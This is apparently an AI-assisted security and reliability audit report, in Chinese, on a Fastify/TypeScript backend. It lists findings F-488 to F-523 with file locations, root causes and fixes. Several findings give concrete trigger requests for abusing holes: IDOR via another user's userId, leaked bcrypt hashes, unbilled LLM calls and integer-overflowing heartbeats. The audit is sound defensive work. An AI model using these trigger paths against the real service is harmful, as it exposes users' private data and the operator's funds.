- 触发路径：任意登录用户 `GET /api/groups/`、`GET /api/groups/<任意组id>/members`。
- 根因：插件仅挂 `requireAuth`；列表无 `ownerId`/成员过滤；成员接口查组后直接 `leftJoin users` 返回，未校验请求者身份。同文件写接口 `:114/138/194` 均有属主校验。
- 证据：`:60-66` 仅 `status='active'`；`:151-172` 只按 `groupId` 查。
- 影响面：全站用户组名称/描述/ownerId、成员 userId/昵称/头像可被任意账号枚举（隐私泄露、社工/撞库素材）。
- 建议修法：列表收敛为 `ownerId=me OR id IN (本人所在组)`；成员接口加成员/管理员闸。
- 是否当场可修：是。

#### F-488 公告详情不校验 `expiresAt`/`publishedAt`，过期公告与未来稿可读
- 严重度：P3
- 文件与行号：`routes/announcements.ts:56-69`；列表 `db/content-queries.ts:26-38`
- 触发路径：公告过期后 `GET /api/cli/announcements/<id>`；定时公告未到点按 id 直取。
- 根因：列表用 `or(isNull(expiresAt), gt(expiresAt, now))`，详情只判 `isPublished`；两处均未判 `publishedAt <= now`.
- 证据：`content-queries.ts:33-35` 有过期条件；`announcements.ts:67` 仅 `!a || !a.isPublished`。
- 影响面：撤回/过期公告全文长期可读；定时公告提前泄露。
- 建议修法：抽公共谓词 `isPublished && (publishedAt IS NULL OR <= now) && (expiresAt IS NULL OR > now)`，列表/详情复用。
- 是否当场可修：是。

#### F-489 CLI 公告接口全表拉取后在内存截断
- 严重度：P3
- 文件与行号：`routes/announcements.ts:36-37,92-96`；`db/content-queries.ts:28-37`
- 触发路径：`GET /api/cli/announcements/latest?limit=10`、`GET /api/cli/announcements/version`。
- 根因：`findAnnouncements()` 无 limit 且 `select()` 取全部列（含 `content` 正文），路由层再 `slice`；`version` 仅需 `max(publishedAt)`+`count`。
- 证据：`content-queries.ts:28-37` 无 limit；`announcements.ts:37`、`:96` 为 `all.slice/all.length`。
- 影响面：公告量增长后每次 CLI 心跳都全表扫描并物化正文，DB/内存放大。
- 建议修法：`latest` 下推 `.limit()` 且只取摘要列；`version` 用聚合单查询。
- 是否当场可修：是。

#### F-490 管理员用户写接口 `.returning()` 回传 `password_hash`
- 严重度：P2
- 文件与行号：`routes/admin/member-users.ts:23-25,143,173,191`
- 触发路径：`PATCH /api/admin/member/users/:id`、`POST /api/admin/member/users`、`DELETE /api/admin/member/users/:id` 任一成功响应。
- 根因：`.returning()` 无列投影返回整行；同插件 `onRequest` 显式 `request.skipResponseSanitization = true`，响应脱敏也不生效。
- 证据：`:24` 关闭脱敏；`:143`、`:173`、`:191` 三处 `returning()` 无投影；对照 GET `:100-116` 有白名单投影且刻意不含 passwordHash。
- 影响面：bcrypt 哈希下发至管理端浏览器/日志/代理，弱口令可离线爆破；违反最小披露。
- 建议修法：三处改 `.returning({ id, username, nickname, ... })` 投影，或在 Drizzle 层 `omit` passwordHash。
- 是否当场可修：是。

#### F-491 创建用户未校验唯一性与列长，重复/超长入参直接 500
- 严重度：P3
- 文件与行号：`routes/admin/member-users.ts:148-176`；列定义 `packages/database/src/schema/users.ts:49-53`
- 触发路径：`POST /api/admin/member/users` 传已存在 phone/email，或 `nickname>64`、`phone>20`、`email>255`。
- 根因：`nickname: z.string().min(1)`（无 max）、`phone: z.string()`、`email: z.email()`（无 max），插入前无查重、无 try/catch。
- 证据：`users.ts:49-51` 为 `varchar(20/255/64)` 且 unique；handler `:162-175` 直接 insert；23505/22001 冒泡 500。
- 影响面：后台重复提交报“服务器错误”，语义错误且排障困难。
- 建议修法：补 `max` 与 `.trim()`；先查重并捕 23505 → 409。
- 是否当场可修：是。

#### F-492 生图 worker 无租约，多实例重复生图并互相覆写状态
- 严重度：P2
- 文件与行号：`workers/image-task-worker.ts:31,47-51,74-84`
- 触发路径：`IHUI` 多副本部署（或多进程 cluster），同一批 pending 任务被两个实例同时取到。
- 根因：`running` 是进程内模块级布尔（`:31`），只防同进程重入；领取 pending 用 `listPendingImageTasks()`（无 `FOR UPDATE SKIP LOCKED`/无状态 CAS），`getImageTask` 后只判 `status==='pending'` 再调上游；完成/失败写回无版本比对。
- 证据：`:39-51` 的重入闸与状态读；`:75`/`:78`/`:82` 直接 `completeImageTask`/`failImageTask` 覆写。
- 影响面：同一任务重复调用上游（重复计费）、后写覆盖先写，成图丢失或状态回退。
- 建议修法：领取改 `UPDATE image_tasks SET status='processing', worker_id=…, lease_until=… WHERE id IN (SELECT … FOR UPDATE SKIP LOCKED)`，完成时带 `WHERE status='processing' AND worker_id=me`。
- 是否当场可修：是。

#### F-493 生图 worker 外部调用无超时，`running` 永不释放导致全队饿死
- 严重度：P2
- 文件与行号：`workers/image-task-worker.ts:39-46,52-59`
- 触发路径：上游生图渠道挂起（TCP 建连成功但无响应）。
- 根因：`forwardToChannel` 未设 AbortSignal/超时；`running=true` 后整轮 await，`finally` 永不执行。
- 证据：`:52-59` 无超时参数；`:40`/`:94-96` 的 `running` 生命周期。
- 影响面：一次挂起即永久阻塞该实例所有后续 pending 任务（每 30s 触发都被 `:39` 挡掉），任务无限积压。
- 建议修法：上游调用加超时（如 60s）+ AbortSignal；超时映射为 failImageTask。
- 是否当场可修：是。

#### F-494 批处理 worker 先占去重键后异步扣费，漏收/重扣
- 严重度：P2
- 文件与行号：`workers/batch-worker.ts:52-64,153-171,350-363,393-406`
- 触发路径：批量任务受理后进入处理与结算，中途崩溃/超时/并发重入。
- 根因：去重键在处理开始前即写入，扣费在其后异步执行；去重键不因扣费失败回滚，重试路径也不重算费用。
- 证据：`:52-64` 占键；`:153-171`/`:350-363` 处理与扣费分离；`:393-406` 去重判定只看键是否存在。
- 影响面：扣费失败被去重键永久吞掉 → 漏收；异常重入则重复开票 → 重扣。
- 建议修法：扣费与状态推进放同一事务；去重键带结算标记，未结算允许重试。
- 是否当场可修：是。

#### F-495 批处理 worker 崩溃重跑无断点，重复消耗上游
- 严重度：P3
- 文件与行号：`workers/batch-worker.ts:255-267,282-288,430-447`
- 触发路径：处理到第 N 条时进程被杀，重启后重跑该批。
- 根因：进度仅存进程内，不落库；重跑从批首开始，已成功的条目再次调用上游。
- 证据：`:255-267` 循环无游标持久化；`:282-288` 重启从 0 开始；`:430-447` 无幂等键。
- 影响面：上游成本翻倍、下游重复副作用。
- 建议修法：按条目持久化 `processed_index`/`item_status`，重跑跳过已完成项。
- 是否当场可修：是。

#### F-496 账号池 worker 把退出码 1/超时当成功，BullMQ 记 completed 不重试
- 严重度：P2
- 文件与行号：`workers/relay-account-pool-worker.ts:80-115,291-331`
- 触发路径：子进程/外部探测以非 0 退出或超时结束。
- 根因：结果判定只认 `stdout` 可解析，未校验 `exitCode`/超时标记；函数正常返回 → BullMQ 视为 completed。
- 证据：`:80-115` 的 spawn 结果处理；`:291-331` 返回而非 throw。
- 影响面：账号池状态被错误刷新（健康判死/判活），且不会重试，故障持续到下次调度。
- 建议修法：`exitCode !== 0`/超时 → throw，让 BullMQ 走重试与失败计数。
- 是否当场可修：是。

#### F-497 registry-sync worker 全量 upsert 失败仍返回成功并标 processed
- 严重度：P2
- 文件与行号：`workers/registry-sync-worker.ts:131-158,181-194,218`
- 触发路径：同步批次中所有 upsert 因约束/类型错误失败。
- 根因：逐条捕获后只累计计数，未在任何失败时抛错；末尾仍把 trigger 标 `processed`。
- 证据：`:131-158` 的 catch 吞异常；`:181-194` 返回结果对象；`:218` 更新 trigger 状态。
- 影响面：同步长期“成功”但数据未更新，监控无红项，直到下游功能缺失才暴露。
- 建议修法：全失败或失败率超阈值时 throw；trigger 标 failed 并保留错误。
- 是否当场可修：是。

#### F-498 AI 回调 worker 先 `DELETE … RETURNING` 再落库，重试丢帧
- 严重度：P3
- 文件与行号：`workers/ai-callback-worker.ts:55-65,119-138`
- 触发路径：取到回调帧后落库/转发抛错触发重试。
- 根因：消费语义是“先删后处理”，删除与业务写入不同事务；失败重试时帧已不存在。
- 证据：`:55-65` 的 delete returning；`:119-138` 处理失败仅记录。
- 影响面：回调永久丢失（AI 结果不落地、计费/通知缺失）。
- 建议修法：改为“标记 in-flight → 处理后删除”，或删除与写入同事务。
- 是否当场可修：是。

#### F-499 server.ts 调用未导入的 super-agent 泵函数，开关一开服务起不来
- 严重度：P1
- 文件与行号：`server.ts:478,484`；定义 `services/super-agent-pump-service.ts:311,329`
- 触发路径：`IHUI_SUPER_AGENT_PUMP=true` → `buildServer()` 执行到 `:478` → `ReferenceError: startSuperAgentPumpLoop is not defined` → 未进入 `listen` 前抛错 → `index.ts:527-539` 的 `start().catch` 以 `isListening=false` 直接 `process.exit(1)`。
- 根因：server.ts 的 import 区（`:98-143`）从未引入这两个函数；TypeScript 侧同样报 “Cannot find name”，`tsc`/typecheck 必失败。
- 证据：全仓 `Grep startSuperAgentPumpLoop|stopSuperAgentPumpLoop` 仅 4 处命中（`server.ts:478,484` + service 两处 export + 测试）；主代理复核 `server.ts` 全部 101 行 import 语句无 `super-agent` 字样。
- 影响面：Watchdog 泵功能整体不可用；一旦开启该 env 服务直接启动失败（P1 生产可用性）；`:484` 的 `onClose` 清理也永远不会注册（若绕过启动错误则遗留定时器）。
- 建议修法：在 import 区补 `import { startSuperAgentPumpLoop, stopSuperAgentPumpLoop } from './services/super-agent-pump-service.js'`；并在 `index.ts` shutdown 阶段显式 stop。
- 是否当场可修：是。

#### F-500 ai-ext 插件 preHandler 白名单恒不命中，全部退化为 admin
- 严重度：P2
- 文件与行号：`routes/ai-extended.ts:195-204,210`；对照 `routes/auth.ts:361-363`、`utils/sms-send-captcha.ts:47`
- 触发路径：登录用户 `GET /api/ai-ext/capabilities`、`GET /api/ai-ext/ai-feed/hot`；内部服务 `POST /api/ai-ext/outbound-routes/callback`。
- 根因：`request.routeOptions.url` 返回含插件前缀的全路径（`/api/ai-ext/capabilities`），与 `'/capabilities'` 全等恒为 false，三条白名单均不命中，全部落到末尾 `requireAdmin`。
- 证据：`:196-203` 的三处 `===` 比较；`auth.ts:361-363` 已明确记载该写法“恒不命中”；`sms-send-captcha.ts:47` 已改用后缀匹配。
- 影响面：普通用户能力清单/热榜 403（功能不可用）；内部服务 token 回调被 403，外呼意向分析不执行。
- 建议修法：改用 `url.endsWith('/capabilities')` 或按 `request.routerPath` 后缀匹配；或把三个只读路由拆到独立插件。
- 是否当场可修：是。

#### F-501 clawdbot shutdown→initialize 竞态遗留双 socket
- 严重度：P3
- 文件与行号：`services/clawdbot/gateway.ts:98-105,155-161,183-201`；`services/clawdbot/clawdbot-service.ts:136-153`；`routes/clawdbot.ts:185-196`
- 触发路径：admin 在 `connecting` 期间再次 `POST /initialize`；或 `/shutdown` 后立刻 `/initialize`。
- 根因：`connect` 只判 `connected` 不防 `connecting`；旧 socket 的 `close` 回调无条件 `wsClient=null/connected=false` 并另排重连；`disconnect` 不摘监听、无代次校验；`initialize` 无幂等。
- 证据：`:99`、`:156-160` 的状态判断；`:183-201` 的 close 处理。
- 影响面：旧连接清空新连接状态并派生第三条连接，多 socket 同时 emit `message` → 重复处理/连接泄漏。
- 建议修法：socket 代次号比对 + `initialize` 幂等锁 + disconnect 先摘监听再 close。
- 是否当场可修：是。

#### F-502 学习心跳可伪造/溢出 `watchDuration`
- 严重度：P3
- 文件与行号：`routes/learn.ts:170-175,858-868`；`db/learn-record-queries.ts:307-341`；`schema/learn-record.ts:31`
- 触发路径：已报名用户循环 `POST /learn/lessons/:id/heartbeat {duration: 2000000000}`。
- 根因：`duration` 只有 `min(0)`（`:174`），无上限、不与真实心跳间隔比对；`watchDuration + duration` 为读改写累加（`:317`），列为 `integer`。
- 证据：两次上报即超 `2147483647` → `22P03`，此后该记录心跳长期 500。
- 影响面：学习时长/排行榜/报表可刷；记录写坏后不可恢复（该用户所有心跳失败）。
- 建议修法：单次上限（如 ≤120s）并与 `now - lastBeatAt` 比对；累计用原子 SQL 且 clamp 到 `totalDuration`。
- 是否当场可修：是。

#### F-503 课程评价无报名校验、`signId` 可伪造
- 严重度：P3
- 文件与行号：`routes/learn.ts:986-1010`；`db/learn-extended-queries.ts:1089-1101`
- 触发路径：任意登录用户对任意课程 `POST /learn/lessons/:id/rates`，`signId` 填任意 uuid。
- 根因：仅 `checkAuth`，未 `findSignUp`；`signId` 原样入库；查重与插入非原子。
- 证据：`:996-1010`；同文件作业接口 `:1040-1043` 有 403 闸。
- 影响面：未购买者可刷评分，可关联他人报名记录；并发下重复评价。
- 建议修法：补报名与 `signId` 属主校验；唯一键 upsert。
- 是否当场可修：是。

#### F-504 “我的收藏”返回全部已发布地图
- 严重度：P3
- 文件与行号：`routes/learn.ts:958-963`
- 触发路径：登录用户 `GET /learn/maps/favorites`。
- 根因：全仓无收藏表/字段，直接 `findPublishedMaps()`；同文件其余三个列表亦为全量。
- 证据：`:961`；schema 搜 `map_favorite/LearnMapFavorite` 为 0。
- 影响面：契约假成功，客户端把全部地图当收藏展示。
- 建议修法：先返回 501/空集合并标注未实现，或补收藏表。
- 是否当场可修：是。

#### F-505 `/live/channels/by-ids` 非法 id 直达 SQL
- 严重度：P3
- 文件与行号：`routes/live.ts:224-233`；`db/live-queries.ts:138-145`；schema `:94-96`
- 触发路径：`GET /api/live/channels/by-ids?ids=abc`。
- 根因：`byIdsQuery` 的 `ids` 仅 `z.string().min(1)`，数组元素未逐项 uuid 校验，`inArray(uuid列, ...)` 触发 22P02 未兜。
- 证据：`:233`、`:143`；同文件 `:71` 已有 `z.uuid()`。
- 影响面：参数错误与存在性判断同形 500，日志噪声。
- 建议修法：逐项 `isUuidString`，非法项 400。
- 是否当场可修：是。

#### F-506 腾讯云直播流两接口为桩成功
- 严重度：P3
- 文件与行号：`routes/live.ts:690-721`
- 触发路径：admin `POST/GET /api/admin/live/tencent/streams`。
- 根因：未调用 `tencent-live-service`，直接返回 `push/play.example.com` 假地址；列表恒 `total: 0`。
- 证据：`:701-702`、`:717-718`。
- 影响面：后台显示“创建成功”但流不存在；真实流永远查不到。
- 建议修法：接入服务；未实现则 501 + 明确 stub 标记。
- 是否当场可修：是。

#### F-507 ToolRunner 超时不取消底层执行
- 严重度：P3
- 文件与行号：`services/clawdbot/tool-executor.ts:82,113-130`；`routes/tools.ts:213-256`
- 触发路径：admin `POST /api/tools/debug/timeout`。
- 根因：`withTimeout` 只 reject 包装 promise，未向 handler/ctx 传 AbortSignal，底层任务与副作用继续。
- 证据：`:115-118` 仅 `reject`；`:82` handler 已启动。
- 影响面：上报超时但操作可能已生效（当前真实工具尚未注册，仅 debug 桩可触发）。
- 建议修法：ctx 注入 `AbortSignal` 并在超时时 abort。
- 是否当场可修：是。

### 第十七轮未判定（证据不足，不计入结论）
1. `routes/articles.ts:69-79` 详情只判 `isPublished`、未判列表的 `status=1`，下线文章仍可按 id 读取——与 F-98 同一根因（另一入口），是否计重复需裁量。
2. `/api/cli/announcements/*` 未列入 `plugins/public-paths.ts`，生产 `auth-default-deny=enforce` 下匿名访问 401；需确认 CLI 启动拉取时是否已带 JWT。
3. `services/leaderboard-service.ts:142` `total = rows.length` 被 limit 截断；需确认接口契约是否把 `total` 当总数（web 侧未使用）。
4. `server.ts:265-266` 称 2MiB 约束 multipart“整包”，但 `@fastify/multipart/index.js:187` 以无 `parseAs/bodyLimit` 的流式解析器注册，Fastify 限额不覆盖它；缺 >2MiB multipart 是否 413 的实测证据。
5. 同前缀多路由器（notification/notificationExtended、remoteDevice/remoteExtended 等）是否同 method+path 冲突未逐文件核对；若冲突会在 ready 抛 `FST_ERR_DUPLICATED_ROUTE`。
6. `routes/live.ts:394-441` 日历用 `toISOString()`（UTC）分桶、窗口用本地 `Date` 构造；是否错日取决于部署 TZ（F-263 称镜像默认 UTC），缺部署证据。
7. `services/clawdbot/session-manager.ts:226-341` 一次 DB 失败即永久 `dbDisabled` 且 `resetDbState` 无调用者；但 agent-runtime 只用内存 `create/get/appendMessage`，DB 方法无活跃入口，影响面待确认。

---

## 二十二、第十八轮新增（workers 剩余 / 双入口一致性 / 注册矩阵 / 定时器配对）

> 覆盖方式：四路并行只读审计。A=workers 剩余 5 个；B=双入口一致性；C=路由注册矩阵反查；D=定时器启停配对。本轮**注册矩阵反查为零重复、零守卫不一致**，是首个「子面零新增」之外的强负结论。主代理复核了 F-508、F-510、F-514、F-515、F-521、F-522、F-518~F-520。

#### F-508 USDT 链上 RPC 六处 `fetch` 无 AbortSignal，单次 poll 可挂数小时并阻塞分钟级队列
- 严重度：P2
- 文件与行号：`workers/usdt-payment-worker.ts:60-79`；`services/payment-usdt-service.ts:532,578,613,628,677,764`
- 触发路径：cron 每分钟入队 `poll-pending` → `pollPendingUsdtPayments()` 串行遍历最多 50 个 pending 单 → 每单 `checkUsdtPaymentStatus`（TronGrid/Etherscan）→ 到账后 `confirmUsdtPaymentWithOnChainCheck` 再发 1~2 次链上取证 + 最新块查询。
- 根因：6 处链上 `fetch` 均为裸调用，无 `AbortSignal`/`AbortSignal.timeout`、无外层 deadline；`new Worker(..., { concurrency: 1 })`（`:78`）不设 `lockDuration`，唯一消费者被单次 poll 独占。
- 证据：主代理 Grep 确认 `payment-usdt-service.ts` 全文 6 处 `await fetch(`、0 处 `AbortSignal`；`:78` 的 `concurrency: 1`。
- 影响面：上游一次抖动即让此后每分钟的 `poll-pending` 在 wait 队列堆积，订单到账确认最长延迟数小时，期间新订单无人轮询。
- 建议修法：链上 `fetch` 统一加 `signal: AbortSignal.timeout(8_000~15_000)`；poll 增加整轮 deadline 与单轮订单上限；job 加 `lockDuration`。
- 是否当场可修：是。

#### F-509 链上 API 故障被吞成 `pending`，poll 的 `failed` 恒 0，job 永远记成功
- 严重度：P3
- 文件与行号：`services/payment-usdt-service.ts:485-498`；`workers/usdt-payment-worker.ts:67-76`
- 触发路径：TronGrid/Etherscan 返回 5xx/超时/响应异常。
- 根因：`checkUsdtPaymentStatus` catch 后 `return { status:'pending', detected:false }`，把「上游不可用」降级为业务态；poll 无 `rpcErrors` 计数，worker 正常返回 → BullMQ 记 completed。
- 证据：`:491-497` 的 catch 返回；`usdt-payment-worker.ts:68-76` 只打 `checked/confirmed/failed` 后 `return result`。
- 影响面：链上服务全挂时监控显示「每分钟成功、失败 0」，用户充值长时间不到账且无告警。
- 建议修法：返回值增加 `error/degraded` 字段；poll 统计 RPC 错误数，超阈值 throw 或走告警。
- 是否当场可修：是。

#### F-510 scheduler 的 `ai-feed-process` / `ai-feed-drain` 全链路吞异常后仍记 `success`
- 严重度：P3
- 文件与行号：`workers/scheduler-worker.ts:701-741`（process）、`:742-801`（drain）
- 触发路径：每 6h 的 `ai-feed-process`：`generateSnapshot` 抛错 → `.catch` 返回 `{insertedRows:0}`；`processLlmBatch/translateTitles/computeTrendSignals` 任一或全部抛错 → 各自 `.catch` 返回 0 值；函数无异常返回 → `recordJobExecution(name,'success')`。`ai-feed-drain` 同理合成「全零 + zeroProgress」后记 success。
- 根因：以「未抛错」判定成功，而异常已在子任务层被转成零值；`failed`/`zeroProgress` 只进日志不进指标。
- 证据：主代理复核 `:704-707`、`:712-725`、`:735-739`（recordJobExecution success）；drain 见 `:761-776` + `:795-799`。
- 影响面：LLM 分类/翻译/摘要全挂或快照生成失败时面板仍显示成功，内容流水线可静默停摆多天。
- 建议修法：任一子任务 catch 命中即记 `failed` 并（至少）不记 success；drain 的 1h 锁改为带续约租约。
- 是否当场可修：是。

#### F-511 `notification-worker` 邮件出口失败被吞，job 仍 completed
- 严重度：P3
- 文件与行号：`workers/notification-worker.ts:39-87`（catch `:82-84`，返回 `:87`）
- 触发路径：入队通知带 `email` 字段（如广播 `routes/notifications.ts:434`）→ `sendEmail` 抛错或返回 `sent:false`。
- 根因：只 `log.warn`，随后 `return { notificationId }`；也未检查 `sendEmail` 的 `result.sent`（该函数自身把 SMTP/Resend 失败转成 `sent:false`，见 F-36）。
- 证据：`:76-81` 返回值未检查；`:82-84` warn；`:87` 正常 return。
- 影响面：站内信落库但邮件通道静默丢失，队列 `attempts:3` 完全空转。
- 建议修法：`if (!result.sent && !result.stub) throw`；或转投已修复的 email 队列。
- 是否当场可修：是。

#### F-512 `notification-worker` 无幂等键，重投会重复落库 + 重复发信
- 严重度：P3
- 文件与行号：`workers/notification-worker.ts:27-33`；生产者 `routes/notifications.ts:434-446`；`plugins/queue.ts:136-144`
- 触发路径：广播 `addBulk` 不设 `jobId` → worker 先 `createNotification` 插入（`db/notification-queries.ts:79-92` 普通 INSERT，无 onConflict）→ push/email 阶段进程被杀，job 重投 → 同一用户两条站内信 + 二次邮件。
- 根因：至少一次投递语义下副作用无幂等键，`attempts: 3` 放大窗口。
- 证据：`:27-33` 的 insert；`routes/notifications.ts:434-446` 的 `addBulk` 元素只有 `name/data`。
- 影响面：广播场景重复通知/重复邮件按用户数放大，邮件不可撤回。
- 建议修法：入队用确定性 `jobId`（`notif:<userId>:<batchId>`）；对 `(userId, batchId, type)` 加唯一约束或 `onConflictDoNothing`。
- 是否当场可修：是。

#### F-513 `relay-health-check` 无全局互斥，且整块回写 `extra_metadata` 丢失并发更新
- 严重度：P3
- 文件与行号：`workers/relay-health-check-worker.ts:67-89`；`services/relay-health-check-service.ts:196-220,311-348`
- 触发路径：多副本部署下，同一 5 分钟窗口的不同 tick job 被不同副本同时消费（BullMQ 只保证单 job 单消费者，不保证不同 tick 不重叠）。
- 根因：service 层无分布式锁；`persistResult` 按查询时快照整块写回 `{...meta, [CF_KEY]: newFailures}`，不是条件更新。
- 证据：`worker:88` 的 `concurrency: 1` 仅进程内串行；`service:211-219` 的整块 `extraMetadata` 更新；`:303-305` 的逐 key `catch {}`。
- 影响面：`consecutiveFailures` 丢失更新，「连续 3 次 down 熔断」需要更多轮才触发，故障 Key 在售卖池停留更久；整块回写还会覆盖巡检期间管理员改的 `baseUrl`。
- 建议修法：入口加 Redis 分布式锁（TTL 覆盖最长巡检 + 续约）；`consecutiveFailures` 改原子自增；`extra_metadata` 用 jsonb 定向 set。
- 是否当场可修：是。

#### F-514 `/api/langchain/chat|agent` 用平台 DashScope 密钥调用却完全不扣积分
- 严重度：P2
- 文件与行号：`routes/legacy-langchain.ts:52-54,57-80,83-112`；对照 `routes/ai-vendors/proxy-llm.ts:277-301`；`routes/ai-vendors/_shared.ts:1339-1349`
- 触发路径：任意登录用户 `POST /api/langchain/chat`（`{messages, model:"qwen-max"}`）或 `POST /api/langchain/agent`。
- 根因：两套入口调用**同一上游 URL 与同一平台密钥**，但只有 `/api/ai/dashscope/chat` 串了 `ensurePointsBalance()` + `chargePointsForCall()`；`legacy-langchain` 仅 `recordUsage()`，而 `recordUsage` 只写进程内 Map，既不持久化也不扣费。
- 证据：主代理复核 `legacy-langchain.ts:64-79`（callVendor 后仅 `recordUsage`）；`proxy-llm.ts:290,299` 余额校验与扣费；`_shared.ts:1341-1348` 的 `usageStore` 读改写；`legacy-langchain.ts:19-24` 的 `model` 无白名单。
- 影响面：登录用户可无限量白嫖平台 DashScope 额度（含最贵模型），成本全部落在平台账户。
- 建议修法：复用 `ensurePointsBalance` + `chargePointsForCall` 与同一模型白名单，或直接转调 `proxy-llm` 的 handler。
- 是否当场可修：是。

#### F-515 `legacy-learn` 三个学习统计接口按 `query.userId` 读任意用户数据（IDOR）
- 严重度：P3
- 文件与行号：`routes/legacy-learn.ts:20,23-31,33-40,42-53`；对照 `routes/learn.ts:781-785`
- 触发路径：`GET /api/legacy/learn/stats/{total-time,today-time,rank-percent}?userId=<他人uuid>`。
- 根因：三个 handler 只挂 `authenticate`，`userId` 全取自 query，从不与 `request.userId` 比对，也无管理员判定；`learn_record.member_id` 与 `users.id` 同 UUID 空间，归属本可在服务端判定。
- 证据：主代理复核 `:20` 的 schema、`:24/:34/:43` 的 parse、`:27` 的 `WHERE member_id = ${userId}`；主入口 `learn.ts:783` 用 `request.userId!`。
- 影响面：可枚举任意用户累计/当日学习时长与排名百分位（行为画像、隐私泄露）。
- 建议修法：仿 `legacy-exam.ts:56-65` 的 `requireSelfScope`，自报 userId 非本人即 403。
- 是否当场可修：是。

#### F-516 `/mobile/circles/:id/messages` 直插 `circle_posts`，绕过 `createPost()` 的 `post_count` 维护
- 严重度：P3
- 文件与行号：`routes/mobile-chat-routes.ts:816-848`（裸 insert `:844-847`）；对照 `routes/community/circles.ts:501-532`、`db/community-queries.ts:164-187`
- 触发路径：登录用户 `POST /api/mobile/circles/<uuid>/messages {content}`。
- 根因：同一语义「发圈子帖」两个写入口：`community/*` 走 `createPost()`（插入后同一逻辑 `post_count + 1`），mobile-chat 直接 insert 且无事务、不更新计数。
- 证据：`:844-847` 的 `db.insert(circlePosts).values(...).returning({id})` 后无 postCount 更新；`community-queries.ts:181-185` 有 `postCount + 1`。
- 影响面：移动端主入口发出的每条圈子消息都不计入 `circles.post_count`，热度排序/展示持续偏低，两入口不可对账。
- 建议修法：改调 `createPost()`，或 insert + 计数递增同事务。
- 是否当场可修：是。

#### F-517 `legacy-learn` 专题详情/课时不过滤发布状态，草稿元数据匿名可读
- 严重度：P3
- 文件与行号：`routes/legacy-learn.ts:56-77`（列表过滤 `:74`）、`:79-99`（详情）、`:101-107`（课时）；对照 `routes/learn.ts:649-655`
- 触发路径：匿名 `GET /api/legacy/learn/topics/<id>`、`GET /api/legacy/learn/topics/<id>/lessons`。
- 根因：列表端点判 `status='published'`，详情只按主键、课时只按关联查，完全不过滤 `learn_topic.status` 与 `lessons.isPublished`（默认 false）。
- 证据：`:74` 有 status 条件；`:97`、`:104` 无；`learn.ts:655` 主站有 `!lesson.isPublished → 404`。
- 影响面：未发布专题/课程的标题、简介、封面、价格、讲师等元数据可被匿名枚举（不含视频地址与题目正文）。
- 建议修法：详情补 status 谓词、课时补 `isPublished/status`；管理员预览走显式 `isSystemAdmin` 放行。
- 是否当场可修：是。

#### F-518 死路由：`engine-control-frames.ts` 的 `/engine/rpc` 从未注册
- 严重度：P3
- 文件与行号：`routes/engine-control-frames.ts:34,74`
- 触发路径：无（全仓无任何 import，含测试）。
- 根因：拆分/下线遗留插件，未接入 `routes/index.ts`。
- 证据：主代理 Grep `engine-control-frames|relay-switch-admin|organizationRoutes` 全仓仅 4 处命中，`engine-control-frames` 仅文件自身；静态展开的 4,737 条路由声明中不含。
- 影响面：当前零运行时影响；但这是 RPC 控制通道，日后「补注册」前需先确认鉴权。
- 建议修法：删除文件，或显式注册并补 `preHandler`。
- 是否当场可修：是。

#### F-519 死路由：`admin/relay-switch-admin.ts` 三个 relay 切换端点从未注册
- 严重度：P3
- 文件与行号：`routes/admin/relay-switch-admin.ts:128,141,161,221`
- 触发路径：无（仅 `__tests__/relay-switch-admin.test.ts:35` 引用）。
- 根因：疑似被 `admin-extended`/relay 系列取代后遗留。
- 证据：`admin-missing-routes.ts` 的 33 个动态 import 与 `admin-extended/index.ts` 均未引用；静态展开树不含。
- 影响面：当前零；但「切换目标」属高危运维面，若误注册且缺 `requireAdmin` 后果严重。
- 建议修法：删除；若要保留能力，补注册 + `requireAdmin`。
- 是否当场可修：是。

#### F-520 死路由：`organization.ts` 未注册，且其中 `GET /organizations/list` 无守卫
- 严重度：P3
- 文件与行号：`routes/organization.ts:56,60`（`GET /organizations/list` 无守卫）、`:150,190,217`（其余端点挂 `requireAdmin`）
- 触发路径：生产无（唯一引用为 `__tests__/organization.test.ts:21`，以 `prefix:'/api'` 注册）。
- 根因：测试专用注册；文件内守卫覆盖不均。
- 证据：主代理 Grep 确认 `organizationRoutes` 仅 `routes/index.ts` 之外的定义与测试引用；`routes/index.ts` 无该注册。
- 影响面：当前零；若有人「补注册」到 `/api`，`GET /api/organizations/list` 会暴露全部组织。
- 建议修法：删除文件，或给列表端点补 `requireAdmin` 后再注册。
- 是否当场可修：是。

#### F-521 `startAlgorithmRecordScheduler` 启动了却永不停止，`stopAlgorithmRecordScheduler` 全仓零调用
- 严重度：P3
- 文件与行号：启动 `index.ts:350`（默认开启）；停止实现 `services/algorithm-record-service.ts:332-348`；关停相位 `index.ts:400-426` 无该项
- 触发路径：API 启动 → 注册 6h 备案同步 → SIGTERM → 25 个 stop 相位执行完毕，但无该 stop → 定时器存活到 `process.exit` 强杀。
- 根因：启动块与关停相位是两份人工维护的平行列表，新增启动项时漏加 stop 相（与 F-499 同型）。
- 证据：主代理 Grep `stopAlgorithmRecordScheduler` 全仓仅 1 处（定义）；`startEdgeAccessProbe` 见 `index.ts:64,313`。
- 影响面：因 `unref()` 不阻塞退出，当前无挂死；但关停相位「全覆盖」不变量被破坏，复用/测试场景下旧 6h 定时器无法回收，备案请求按实例数翻倍。
- 建议修法：`index.ts` 导入 stop 并补一个关停相位。
- 是否当场可修：是。

#### F-522 `startEdgeAccessProbe` 只有启动函数，全仓不存在停止/清理路径
- 严重度：P3
- 文件与行号：`services/edge-access.ts:76,213-225`；调用 `index.ts:64,313`
- 触发路径：API 启动 → 每 5 分钟对首页 + 3 条对照腿发真实外网请求 → SIGTERM → 无 stop 被调用，`timer` 与在途 `runEdgeRound()` 不取消。
- 根因：模块只设计 start，无对称 stop；shutdown 相位无对应项。
- 证据：主代理 Grep `stopEdgeAccessProbe` 零命中。
- 影响面：不阻塞退出（已 `unref`）；但关停后无法取消在途探测，嵌入式/测试/长驻复用会持续对外发请求。
- 建议修法：新增 `stopEdgeAccessProbe()`（`clearInterval` + 置 null），在关停相位调用。
- 是否当场可修：是。

#### F-523 `registry-queue` 两个 BullMQ 生产者 Queue 无关闭出口，onClose 只关 Worker
- 严重度：P3
- 文件与行号：`plugins/registry-queue.ts:50-58,113-121`；`routes/registry-sync.ts:248-263,266-274`
- 触发路径：`buildServer()` → 路由插件 onReady 创建两个 Queue → `server.close()` → onClose 仅 `cleanupWorker.close()`。
- 根因：只给消费者配 onClose，生产者无对称 `close()`；未沿用同仓 `plugins/queue.ts:177-203` 的模式。
- 证据：`registry-queue.ts` 全文无 `close()`；`plugins/queue.ts` onClose 显式关 4 个 Queue + QueueEvents。
